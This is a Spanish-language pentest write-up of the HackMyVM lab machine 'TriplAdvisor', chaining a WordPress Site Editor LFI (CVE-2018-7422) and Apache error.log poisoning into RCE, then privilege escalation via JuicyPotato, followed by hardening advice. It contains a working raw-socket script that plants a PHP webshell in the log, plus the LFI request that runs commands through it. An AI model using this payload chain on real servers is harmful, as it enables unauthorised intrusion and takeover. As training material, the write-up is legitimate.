TriplAdvisor — Pentest Report

Máquina Windows con stack XAMPP y WordPress expuesto en el puerto 8080. La cadena de ataque parte de un LFI (CVE-2018-7422) en el plugin Site Editor v1.1, progresa hasta RCE vía Log Poisoning en el error.log de Apache, y culmina en escalada de privilegios a NT AUTHORITY\SYSTEM mediante JuicyPotato explotando SeImpersonatePrivilege.

Descripción del Objetivo

Contexto

TriplAdvisor es una máquina de dificultad Easy de la plataforma HackMyVM que simula un servidor Windows 2008 R2 mal configurado con un stack XAMPP expuesto al exterior. Aloja un WordPress (v5.1.19) con el plugin Site Editor v1.1 vulnerable, junto a un servicio WinRM activo en el puerto 5985 y SMB en el 445.


El usuario de servicio Apache (websvc) posee el privilegio SeImpersonatePrivilege, lo que habilita la explotación de JuicyPotato para obtener acceso como NT AUTHORITY\SYSTEM.

Explotación — LFI (CVE-2018-7422)

Descripción de la Vulnerabilidad

El plugin Site Editor v1.1.1 incluye el archivo ajax_shortcode_pattern.php que utiliza el parámetro GET ajax_path como argumento de require_once() sin ningún tipo de sanitización, permitiendo la inclusión de ficheros arbitrarios del sistema.

Código vulnerable — ajax_shortcode_pattern.php:5
// Sin validación de ruta — vulnerable a LFI if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){ require_once $_REQUEST['ajax_path']; }

Ruta Vulnerable Confirmada

Verificación de paths — curl

RCE vía Log Poisoning

Estrategia: Error.log Poisoning

El access.log de XAMPP contenía código PHP corrupto de intentos previos, causando un HTTP 500 al incluirlo. Se utilizó el error.log como vector alternativo, inyectando PHP mediante una petición HTTP raw con un path inválido que Apache registra como error.

Paso 1 — Inyección de webshell en error.log (raw socket)
# Petición HTTP raw con PHP en el path — Apache lo registra en error.log import socket payload = "<?php echo 'RCE_START'; echo shell_exec($_GET['cmd']); echo 'RCE_END'; ?>" http_req = f"GET /wordpress/{payload} HTTP/1.1\r\nHost: tripladvisor:8080\r\n\r\n" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("tripladvisor", 8080)) s.send(http_req.encode()) # Apache registra el path en error.log
Paso 2 — Inclusión de error.log via LFI + ejecución
# LFI incluye error.log → PHP ejecuta shell_exec($GET['cmd']) GET /wordpress/wp-content/plugins/editor/.../ajax_shortcode_pattern.php ?ajax_path=C:/xampp/apache/logs/error.log &cmd=ipconfig → Windows IP Configuration IPv4 Address: 10.0.2.7 Subnet Mask: 255.255.255.0

Webshell Persistente en htdocs

Para mayor estabilidad, se escribió una webshell PHP limpia directamente en el directorio público de XAMPP usando el RCE obtenido.

Escritura de webshell

Recomendaciones y Hardening

🔌 Actualizar/Eliminar Plugin

El plugin Site Editor v1.1 (CVE-2018-7422) no tiene parche oficial disponible. Debe ser desinstalado o reemplazado inmediatamente. Revisar todos los plugins con wpscan --detect-mode aggressive periódicamente.

📝 Rotación Agresiva de Logs

Activar logrotate diario para access.log y error.log de Apache. Restringir permisos de lectura de logs al usuario del servicio. Considerar escribir logs fuera del webroot.

🔐 Principio de Mínimo Privilegio

El usuario de servicio Apache (websvc) no debería tener SeImpersonatePrivilege. Crear un usuario dedicado con los mínimos privilegios. Deshabilitar los privilegios innecesarios via Local Security Policy.

🛡️ Parchear Windows Server 2008 R2

Windows Server 2008 R2 build 7600 (sin Service Pack) lleva años sin soporte oficial. Migrar a una versión con soporte activo. Si no es posible, aplicar todos los parches disponibles incluyendo MS16-075 y variantes de Potato.

🌐 Restringir WordPress

Deshabilitar la ejecución PHP fuera del directorio raíz de WordPress. Bloquear acceso directo a archivos PHP de plugins via .htaccess. Implementar WAF (ModSecurity) delante de Apache/XAMPP.

🔒 certutil — LOLBin Monitoring

Monitorizar el uso de certutil.exe con parámetros -urlcache mediante SIEM. Este binario legítimo de Windows es frecuentemente abusado para descargas desde el exterior (Living Off the Land Binary).

Exposición Crítica: Ninguno de los tres servicios expuestos (SMB, WinRM, HTTP) estaba protegido por autenticación robusta o segmentación de red. En un entorno de producción, estos servicios nunca deberían estar expuestos directamente sin firewall de perímetro.
